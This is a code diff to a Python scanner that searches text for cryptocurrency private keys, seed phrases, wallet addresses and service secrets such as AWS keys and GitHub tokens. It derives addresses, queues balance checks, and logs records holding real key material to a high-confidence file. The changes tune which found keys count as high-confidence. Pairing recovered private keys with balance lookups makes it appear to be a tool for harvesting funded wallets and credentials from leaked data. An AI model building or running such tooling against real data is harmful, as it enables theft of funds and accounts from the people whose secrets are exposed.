@@ -1544,8 +1544,15 @@ def scan_line(line: str) -> Dict[str, Any]:
     return findings
 
 def material_findings(findings: Dict[str, Any]) -> bool:
-    material_keys = ("btc", "eth", "ltc", "sol", "doge", "xrp", "ton", "avax", "matic",
-                     "wif", "hex_key", "seed_phrase", "aws_key", "github_pat", "slack_token", "stripe_key")
+    """True if findings worth persisting / deriving.
+
+    Hex keys alone only count when IQ already kept them (scan_line pre-filter).
+    Bare low-value address hits still pass so balances can be checked.
+    """
+    material_keys = (
+        "btc", "eth", "ltc", "sol", "doge", "xrp", "ton", "avax", "matic",
+        "wif", "hex_key", "seed_phrase", "aws_key", "github_pat", "slack_token", "stripe_key",
+    )
     return any(findings.get(k) for k in material_keys)
 
 # ---------------------------------------------------------------------------
@@ -1744,6 +1751,12 @@ def main():
             if material_findings(findings):
                 processed += 1
                 findings = correlate_findings(findings, line, context_window)
+                # After IQ scrub, drop records that lost all material
+                if not material_findings(findings) and not (findings.get("derived_addresses")):
+                    context_window.append(line[:200])
+                    if len(context_window) > 3:
+                        context_window.pop(0)
+                    continue
                 src_meta = extract_source_metadata(line)
                 record = {
                     "ts": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
@@ -1783,7 +1796,28 @@ def main():
                 if addr_map:
                     queue_balances(addr_map)
 
-                if findings.get("correlated") or findings.get("wif") or findings.get("hex_key") or findings.get("seed_phrase"):
+                # High-confidence gate: require real key material + IQ score
+                # (stops ascii-text hex and bare address noise flooding HC file)
+                _wallet = findings.get("wallet") or {}
+                _has_real_key = bool(
+                    _wallet.get("wifs")
+                    or _wallet.get("seed_phrases")
+                    or findings.get("wif")
+                    or findings.get("seed_phrase")
+                    or (
+                        (_wallet.get("hex_keys") or findings.get("hex_key"))
+                        and float(findings.get("iq_score") or 0) >= 0.55
+                    )
+                )
+                _hc_ok = bool(
+                    _has_real_key
+                    and (
+                        findings.get("correlated")
+                        or findings.get("confidence") == "high"
+                        or float(findings.get("iq_score") or 0) >= 0.70
+                    )
+                )
+                if _hc_ok:
                     with open(HIGH_CONFIDENCE_FILE, "a") as f:
                         f.write(json.dumps(record) + "\n")
 
